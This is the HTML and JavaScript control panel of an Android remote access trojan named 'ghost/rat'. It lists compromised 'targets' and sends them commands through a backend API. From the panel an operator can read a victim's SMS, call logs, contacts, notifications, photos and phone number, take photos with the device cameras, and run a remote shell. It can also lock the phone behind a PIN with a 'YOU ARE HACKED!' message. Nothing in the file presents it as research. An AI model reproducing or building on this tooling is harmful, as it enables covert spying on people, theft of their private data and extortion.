<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>GhostShell | live</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        :root {
            --bg: #0b0303;
            --surface: #1a0e0e;
            --card: #221212;
            --primary-red: #ff3b3b;
            --primary-green: #5eff9e;
            --dark-red: #5e1a1a;
            --dark-green: #1b4a2a;
            --text: #e3dcdc;
            --dim: #9e7a7a;
            --border-red: #8b2a2a;
            --border-green: #2f9e5a;
            --glow-red: rgba(255, 50, 50, 0.4);
            --glow-green: rgba(80, 255, 120, 0.5);
        }

        body {
            background: #0a0101;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            padding: 8px;
            background-image: radial-gradient(circle at 30% 20%, #2f130f 0%, #020000 100%);
        }

        #main-app {
            display: block;
            width: 100%;
            max-width: 480px;
            margin: 0 auto;
        }

        .app-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .panel {
            background: #140a0a;
            border: 2px solid #6d2b2b;
            border-radius: 32px;
            padding: 16px 14px;
            box-shadow: 0 10px 20px -10px #5e0000, inset 0 0 15px #2f0707;
            background: linear-gradient(160deg, #1d0d0d, #0e0404);
            width: 100%;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-color: #bb4646;
            padding: 12px 14px;
        }

        .header h1 {
            font-size: 1.3rem;
            color: #ff8686;
        }

        .status-bar {
            background: #231212;
            border: 1px solid #c74545;
            border-radius: 40px;
            padding: 10px 16px;
            display: flex;
            justify-content: space-between;
            color: #eaffd6;
            font-size: 0.9rem;
            margin-bottom: 12px;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 8px;
        }

        .grid .btn {
            background: #2a1616;
            border: 2px solid #50a56b;
            border-radius: 24px;
            padding: 14px 4px;
            text-align: center;
            color: #b7ffcc;
            cursor: pointer;
            font-size: 0.7rem;
            box-shadow: 0 3px 0 #3e1313;
            -webkit-tap-highlight-color: transparent;
            transition: 0.1s;
        }

        .btn i {
            display: block;
            font-size: 1.6rem;
            margin-bottom: 4px;
            color: #ff7272;
        }

        .btn:active {
            transform: translateY(2px);
            box-shadow: 0 1px 0 #3e1313;
            border-color: #ff7676;
        }

        .btn.active {
            border-color: #ff5e5e;
            box-shadow: 0 0 0 2px #fbffb0, 0 3px 0 #581c1c;
        }

        #device-list {
            max-height: 200px;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
            padding-right: 4px;
        }

        .device-item {
            background: #1d0f0f;
            border-radius: 24px;
            padding: 12px 14px;
            margin-bottom: 8px;
            border-left: 6px solid #d64747;
            cursor: pointer;
            font-size: 0.9rem;
            -webkit-tap-highlight-color: transparent;
        }

        .device-item.active {
            border-left-color: #76ffa0;
            background: #2e1b1b;
            box-shadow: 0 0 0 2px #ff8888;
        }

        .modal {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.96);
            backdrop-filter: blur(8px);
            align-items: center;
            justify-content: center;
            padding: 12px;
            z-index: 1100;
        }

        .modal-card {
            background: #1d0d0d;
            border: 3px solid #ff6b6b;
            border-radius: 40px;
            width: 100%;
            max-width: 440px;
            max-height: 85vh;
            display: flex;
            flex-direction: column;
        }

        .modal-header {
            padding: 16px 18px;
            background: #1d0a0a;
            display: flex;
            justify-content: space-between;
            border-radius: 40px 40px 0 0;
        }

        .modal-body {
            padding: 16px;
            overflow-y: auto;
            background: #1c0c0c;
            -webkit-overflow-scrolling: touch;
        }

        .modal-footer {
            padding: 14px;
            background: #1f0b0b;
            border-radius: 0 0 40px 40px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }

        .data-table {
            width: 100%;
            border-collapse: collapse;
            color: #e0d5d5;
            font-size: 0.9rem;
        }
        .data-table th {
            text-align: left;
            color: #ffa8a8;
            border-bottom: 2px solid #ba4a4a;
            padding: 8px 4px;
        }
        .data-table td {
            padding: 8px 4px;
            border-bottom: 1px solid #5e3333;
            vertical-align: top;
        }

        .terminal {
            background: #080202;
            color: #b3ffc1;
            font-family: monospace;
            padding: 16px;
            border-radius: 24px;
            height: 220px;
            overflow: auto;
            border: 2px solid #7affa8;
            font-size: 0.85rem;
        }

        .gal-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
        }

        .gal-item img {
            width: 100%;
            height: 80px;
            object-fit: cover;
            border-radius: 16px;
            border: 2px solid #fc6b6b;
        }

        input, textarea {
            background: #2b1616;
            border: 2px solid #cf5a5a;
            padding: 12px 16px;
            border-radius: 40px;
            color: white;
            width: 100%;
            font-size: 1rem;
        }

        button {
            background: #c24f4f;
            border: none;
            color: black;
            font-weight: bold;
            padding: 10px 18px;
            border-radius: 40px;
            cursor: pointer;
            font-size: 0.9rem;
            -webkit-tap-highlight-color: transparent;
        }
        button:active { opacity: 0.8; }
        .red-btn { background: #ff2727; color: white; }

        @media (min-width: 480px) {
            .grid { grid-template-columns: repeat(5, 1fr); }
        }
    </style>
</head>
<body>
<div id="main-app">
    <div class="app-container">
        <header class="panel header">
            <h1><i class="fas fa-skull"></i> ghost/rat</h1>
            <div style="display:flex; gap:10px; align-items:center;">
                <span style="color:#b1ffb1; font-size:0.9rem;"><i class="fa-regular fa-id-card"></i> <span id="user-display">visitor</span></span>
                <button onclick="logout()" style="background:#4d2727; border:2px solid #ff6a6a; padding:6px 12px;">âœ•</button>
            </div>
        </header>

        <div class="panel">
            <h3 style="color:#ffa3a3; margin-bottom:12px; font-size:1.1rem;"><i class="fa-regular fa-compass"></i> TARGETS</h3>
            <div id="device-list">scanning...</div>
        </div>

        <div class="panel">
            <div class="status-bar">
                <span>ðŸŽ¯ <b id="sel-info" style="color:#b3ffb3;">None</b></span>
                <span>ðŸ“¶ <b id="conn-stat" style="color:#ff5e5e;">OFF</b></span>
            </div>
            <div class="grid" id="main-grid"></div>
        </div>
    </div>
</div>

<div id="modal" class="modal">
    <div class="modal-card">
        <div class="modal-header">
            <h3 id="modal-title" style="color:#ffa8a8;">MODAL</h3>
            <span style="cursor:pointer; font-size:2rem;" onclick="closeModal()">&times;</span>
        </div>
        <div class="modal-body" id="modal-body"></div>
        <div class="modal-footer" id="modal-footer"></div>
    </div>
</div>

<script>
    (function() {
        // ---------- AUTH CHECK ----------
        const uid = localStorage.getItem('ghost_uid');
        if (!uid) {
            window.location.href = 'index.html';
            return;
        }
        document.getElementById('user-display').innerText = uid;

        // ---------- STATE (no dummy data) ----------
        let devices = [];               // will be filled by poll
        let selectedDeviceId = null;
        let flashState = false;
        let curMod = null;
        let termOutput = '';
        let cache = {};                 // cache per device untuk data modal

        // UI elements
        const deviceListEl = document.getElementById('device-list');
        const selInfoEl = document.getElementById('sel-info');
        const connStatEl = document.getElementById('conn-stat');
        const mainGridEl = document.getElementById('main-grid');

        // ---------- REAL-TIME DEVICE POLLING ----------
        async function pollDevices() {
            try {
                const res = await fetch(`/api/status?owner=${uid}&_=${Date.now()}`);
                if (!res.ok) throw new Error('poll failed');
                const data = await res.json();
                // data.devices MUST be array of { id, model, man, ver, bat, ... }
                devices = data.devices || [];
                renderDeviceList();

                // if selected device disappeared, reset
                if (selectedDeviceId && !devices.find(d => d.id === selectedDeviceId)) {
                    selectedDeviceId = null;
                    updateSelection();
                }
            } catch (e) {
                console.warn('poll error', e);
                devices = [];
                renderDeviceList();
            }
            setTimeout(pollDevices, 3000);
        }

        function renderDeviceList() {
            if (!devices.length) {
                deviceListEl.innerHTML = '<div style="color:#ff8888; padding:10px;">â›” no targets online</div>';
                return;
            }
            deviceListEl.innerHTML = devices.map(d => `
                <div class="device-item ${selectedDeviceId === d.id ? 'active' : ''}" onclick="selectDevice('${d.id}')">
                    <b style="color:#ffb5b5">${d.model || 'unknown'}</b> (${d.man || '?'})<br>
                    <small style="color:#a5d6b2">Android ${d.ver || '?'} | âš¡ ${d.bat || '?'}%</small>
                </div>
            `).join('');
        }

        window.selectDevice = (id) => {
            selectedDeviceId = id;
            renderDeviceList();
            updateSelection();
        };

        function updateSelection() {
            if (selectedDeviceId) {
                selInfoEl.innerText = selectedDeviceId;
                connStatEl.innerText = 'ONLINE';
                connStatEl.style.color = '#9effb0';
            } else {
                selInfoEl.innerText = 'None';
                connStatEl.innerText = 'OFF';
                connStatEl.style.color = '#ff7a7a';
            }
            renderMainButtons();
        }

        // ---------- MAIN BUTTON GRID ----------
        function renderMainButtons() {
            const btns = [
                { id:'filemanager', i:'fa-terminal', l:'SHELL' }, { id:'info', i:'fa-circle-info', l:'INFO' },
                { id:'panic', i:'fa-triangle-exclamation', l:'LOCK' }, { id:'contacts', i:'fa-address-book', l:'CON' },
                { id:'sms', i:'fa-sms', l:'SMS' }, { id:'calls', i:'fa-phone', l:'CALLS' },
                { id:'gallery', i:'fa-images', l:'GALL' }, { id:'notifications', i:'fa-bell', l:'NOTIF' },
                { id:'apps', i:'fa-th', l:'APPS' }, { id:'flash', i:'fa-bolt', l:'FLASH' },
                { id:'vibrate', i:'fa-mobile-vibration', l:'VIB' }, { id:'voice', i:'fa-microphone', l:'VOICE' },
                { id:'takebackpic', i:'fa-camera', l:'CAM B' }, { id:'takefrontpic', i:'fa-video', l:'CAM F' },
                { id:'setwallpaper', i:'fa-image', l:'WALL' }, { id:'toast', i:'fa-lock', l:'LOCK' },
                { id:'open_url', i:'fa-globe', l:'URL' }
            ];
            mainGridEl.innerHTML = btns.map(b => 
                `<div class="btn ${b.id==='flash' && flashState ? 'active':''}" onclick="${b.id==='flash' ? 'toggleFlashBtn(this)' : 'window.openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`
            ).join('');
        }

        window.toggleFlashBtn = (btn) => {
            flashState = !flashState;
            btn.classList.toggle('active');
            if (selectedDeviceId) cmd(flashState ? 'flashon' : 'flashoff');
        };

        // ---------- COMMAND SENDER ----------
        window.cmd = function(command, extra = {}) {
            if (!selectedDeviceId) return;
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cmd: command, client_id: selectedDeviceId, ...extra })
            }).catch(e => console.warn('cmd error', e));
        };

        // ---------- MODAL HANDLER (real data) ----------
        window.openModal = (t) => {
            if (!selectedDeviceId) return;
            curMod = t;
            document.getElementById('modal').style.display = 'flex';
            document.getElementById('modal-title').innerText = t.toUpperCase();
            const body = document.getElementById('modal-body');
            const foot = document.getElementById('modal-footer');
            body.innerHTML = ''; foot.innerHTML = '';

            if (t === 'filemanager') {
                termOutput = 'ghost@android:~#\n';
                body.innerHTML = `<div class="terminal" id="terminal">${termOutput}</div>
                    <div style="display:flex; gap:5px; margin-top:8px;">
                        <span style="color:#ffa4a4">Î»</span>
                        <input id="term-in" style="background:#1b0b0b; border:2px solid #de5a5a;" onkeydown="if(event.key==='Enter') execShellCmd()">
                    </div>`;
                foot.innerHTML = `<button onclick="document.getElementById('up-file').click()">UPLOAD</button><input type="file" id="up-file" style="display:none">`;
                cmd('filemanager');
            }
            else if (t === 'panic') {
                body.innerHTML = `<p>seconds:</p><input type="number" id="psec" value="30"><p>message:</p><textarea id="pmsg">YOU ARE HACKED!</textarea>`;
                foot.innerHTML = `<button class="red-btn" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value)">START</button>`;
            }
            else if (t === 'voice') {
                body.innerHTML = `<div style="text-align:center;padding:20px;"><i class="fas fa-microphone" style="font-size:3rem;color:#ff8888"></i><p id="v-stat">ready</p></div>`;
                foot.innerHTML = `<button onclick="startMockRec()">START</button><button onclick="stopMockRec()" style="display:none;" id="v-stop">STOP</button>`;
            }
            else if (t === 'toast') {
                body.innerHTML = `<p>message:</p><textarea id="lmsg">SYSTEM CRITICAL</textarea><p>PIN:</p><input id="lpin" value="1337">`;
                foot.innerHTML = `<button class="red-btn" style="flex:1;" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK</button> 
                                  <button style="flex:1;" onclick="cmd('unlock')">UNLOCK</button>`;
            }
            else if (t === 'vibrate') {
                body.innerHTML = `<p>duration (s):</p><input id="vsec" value="3">`;
                foot.innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">VIBRATE</button>`;
            }
            else if (t === 'setwallpaper') {
                body.innerHTML = `<p>upload:</p><input type="file" onchange="uploadWall(this)"><p>url:</p><input id="wurl" value="https://example.com/img.jpg">`;
                foot.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY</button>`;
            }
            else if (t === 'open_url') {
                body.innerHTML = `<p>URL:</p><input id="ourl" value="https://google.com">`;
                foot.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
            }
            else {
                // All data modules: show loading then send command
                body.innerHTML = `<p style="color:#aaa; padding:20px;">loading ${t}...</p>`;
                foot.innerHTML = `<button onclick="cmd('${mapCmd(t)}')">REFRESH</button>`;
                cmd(mapCmd(t));
            }

            function mapCmd(modalType) {
                const map = {
                    sms: 'getsms', calls: 'getcalllogs', contacts: 'getcontacts',
                    notifications: 'getnotifications', info: 'deviceinfo',
                    gallery: 'gallery', apps: 'list_app',
                    takebackpic: 'takebackpic', takefrontpic: 'takefrontpic'
                };
                return map[modalType] || modalType;
            }
        };

        // ---------- UPDATE MODAL WITH REAL DATA ----------
        window.updateModalData = function(type, data) {
            if (curMod !== type) return;
            const body = document.getElementById('modal-body');
            if (!body) return;

            if (type === 'sms') {
                body.innerHTML = `<table class="data-table"><tr><th>Sender</th><th>Message</th></tr>${
                    (data || []).map(s => `<tr><td>${s.userSender || '?'}</td><td>${s.content || ''}</td></tr>`).join('')
                }</table>`;
            }
            else if (type === 'calls') {
                body.innerHTML = `<table class="data-table"><tr><th>Number</th><th>Duration</th></tr>${
                    (data || []).map(c => `<tr><td>${c.number}</td><td>${c.duration_seconds || '?'}s</td></tr>`).join('')
                }</table>`;
            }
            else if (type === 'contacts') {
                body.innerHTML = `<table class="data-table"><tr><th>Name</th><th>Number</th></tr>${
                    (data || []).map(c => `<tr><td>${c.name || '?'}</td><td>${c.number || ''}</td></tr>`).join('')
                }</table>`;
            }
            else if (type === 'notifications') {
                body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Text</th></tr>${
                    (data || []).map(n => `<tr><td>${n.packageName}</td><td>${n.title}: ${n.text}</td></tr>`).join('')
                }</table>`;
            }
            else if (type === 'info') {
                const i = data || {};
                body.innerHTML = `<table class="data-table"><tr><td>Model</td><td>${i.Model || ''}</td></tr><tr><td>Manufacturer</td><td>${i.Manufacturer || ''}</td></tr><tr><td>Android</td><td>${i.AndroidVersion || ''}</td></tr><tr><td>Battery</td><td>${i.Battery || ''}</td></tr><tr><td>Phone</td><td>${i.PhoneNumber || ''}</td></tr></table>`;
            }
            else if (type === 'gallery') {
                if (data && data.files) {
                    body.innerHTML = `<div class="gal-grid">${
                        data.files.map(f => `<div class="gal-item"><img src="data:image/jpeg;base64,${f.thumbnail || ''}" /><p style="font-size:0.6rem">${f.name}</p></div>`).join('')
                    }</div>`;
                } else {
                    body.innerHTML = '<p>no images</p>';
                }
            }
            else if (type === 'apps') {
                body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Action</th></tr>${
                    (data || []).map(a => `<tr><td>${a.appName || a.packageName}</td><td><button onclick="cmd('run ${a.packageName}')">RUN</button></td></tr>`).join('')
                }</table>`;
            }
            else if (type === 'filemanager') {
                // handled separately via terminal
            }
        };

        // ---------- UTILS ----------
        window.execShellCmd = () => {
            let inp = document.getElementById('term-in');
            if (!inp) return;
            const cmdLine = inp.value;
            termOutput += `\n# ${cmdLine}`;
            document.getElementById('terminal').innerText = termOutput;
            cmd(cmdLine);
            inp.value = '';
        };

        window.closeModal = () => {
            document.getElementById('modal').style.display = 'none';
            if (curMod === 'filemanager') cmd('exit_shell');
            if (curMod === 'gallery') cmd('exit_gallery');
            curMod = null;
        };

        window.logout = () => {
            localStorage.removeItem('ghost_uid');
            window.location.href = 'index.html';
        };

        // mock functions (can be replaced with real implementations)
        window.startMockRec = window.startMockRec || function() {};
        window.stopMockRec = window.stopMockRec || function() {};
        window.uploadWall = window.uploadWall || function() {};

        // start polling
        updateSelection();
        pollDevices();

        // expose for server push (optional)
        window.receiveModalData = window.updateModalData;
    })();
</script>
</body>
</html>
